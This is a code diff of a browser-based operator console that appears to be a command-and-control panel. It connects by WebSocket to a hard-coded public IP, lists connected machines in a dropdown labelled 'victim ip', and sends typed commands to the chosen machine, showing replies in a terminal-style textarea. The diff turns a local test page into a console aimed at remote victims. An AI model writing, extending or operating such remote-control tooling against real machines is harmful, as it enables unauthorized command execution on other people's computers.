@@ -6,19 +6,30 @@
 
     var client;
     var content = "";
+    var contentLength = 0;
+    var command;
 
     function startConnection() {
-        client = new WebSocket("ws://127.0.0.1:7777", 'websocket')
+        //client = new WebSocket("ws://127.0.0.1:7777", 'websocket')
+        client = new WebSocket("ws://141.226.121.68:5555", 'websocket')
+
         client.onopen = function () {
-            alert("Connected!")
-            client.send('The client connected!')
+            //alert("Connected!")
+            //client.send('The client connected!')
         }
         client.onmessage = function (data) {
-            if (typeof data.data === 'string') {
+            if (data.data.startsWith("Connected$")) {
+                data = data.data.substr(11, data.data.length)
+                document.getElementById('select ip').innerHTML += '<option value=' + data + '>' + data + '</option>'
+                alert(data + " Connected!")
+            } else {
                 console.log("Received: '" + data.data + "'");
-                content += data.data + "&#13;&#10;"
-                document.getElementById('area').innerHTML = content;
+                content = data.data + "\n"
+                contentLength += content.length;
+                console.log("length is " + contentLength)
+                document.getElementById('area').value += content
             }
+
         };
         client.onclose = function () {
             alert('The connection was close')
@@ -26,15 +37,32 @@
 
     }
 
-    document.getElementById('command', function () {
-        if (key.keyCode === 13 && document.getElementById('command').value != "") {
-            alert("test")
+    document.onkeypress = function (e) {
+        if (e.keyCode === 13) {
+            if (document.activeElement === document.getElementById('area')) {
+                //command = document.getElementById('area').innerText.substr(contentLength).value
+                command = [document.getElementById('area').value.substr(contentLength), document.getElementById('select ip').value]
+                contentLength += command[0].length
+                console.log(command)
+                sendCommand()
+                //alert('test')
+            }
         }
-    })
+    }
 
 
     function sendCommand() {
-        client.send(document.getElementById('command').value)
+        //var x = document.getElementById('command').value
+        command[0] = command[0].replaceAll('\n', '')
+        if (command[0] === "clear" || command[0] === "cls") {
+            content = ""
+            contentLength = 0
+            document.getElementById('area').value = "";
+        } else if (command[0] === "") {
+            return
+        } else {
+            client.send(JSON.stringify(command))
+        }
     }
 
 
@@ -44,14 +72,15 @@
 
 
 <form>
-    <label for="command">Please Enter Command:</label>
-    <input type="text" autofocus id="command" name="Command"><br><br>
-    <button type="button" onclick="sendCommand()">Send Command</button>
     <button type="button" onclick="startConnection()">Start Connection</button>
+    <label for="select ip">Please the victim ip</label>
+    <select name="Select IP" id="select ip">
+
+    </select>
 
 </form>
-
-<textarea id="area" name="output area" rows="80" cols="130"></textarea>
+<textarea id="area" autofocus name="output area" style="background-color:black;color: white" rows="80"
+          cols="200"></textarea>
 
 
 </body>
